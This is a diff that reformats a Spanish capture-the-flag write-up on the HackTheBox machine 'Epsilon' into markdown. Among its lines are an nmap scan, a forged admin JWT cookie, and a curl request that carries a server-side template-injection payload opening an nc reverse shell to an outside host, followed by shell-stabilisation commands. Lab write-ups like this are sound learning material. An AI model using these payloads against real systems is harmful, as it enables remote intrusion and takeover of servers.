@@ -1,13 +1,18 @@
-Writeup - Máquina Epsilon HTB
-Autor: [Tu Nombre]
-Plataforma: HackTheBox
-Dificultad: Media
-Sistema: Linux
+markdown
+# Writeup - Máquina Epsilon HTB
 
-🔍 Reconocimiento
+**Autor**: [Tu Nombre]  
+**Plataforma**: HackTheBox  
+**Dificultad**: Media  
+**Sistema**: Linux  
+
+---
+
+## 🔍 Reconocimiento
+
 Lanzamos un nmap para descubrir puertos abiertos:
 
-bash
+```bash
 nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.134
 https://images/nmap_scan.png
 
@@ -138,14 +143,14 @@ Enviar reverse shell:
 
 bash
 curl -X POST http://10.10.11.134:5000/order \
-  -H "Cookie: auth=TU_TOKEN_JWT" \
+  -H "Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4" \
   --data-urlencode "costume={{lipsum.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 443 >/tmp/f').read()}}"
 https://images/reverse_shell.png
 
 Estabilizar Shell
 bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl+Z
+# Ctrl+Z
 stty raw -echo; fg
 export TERM=xterm
 ⬆️ Escalada de Privilegios
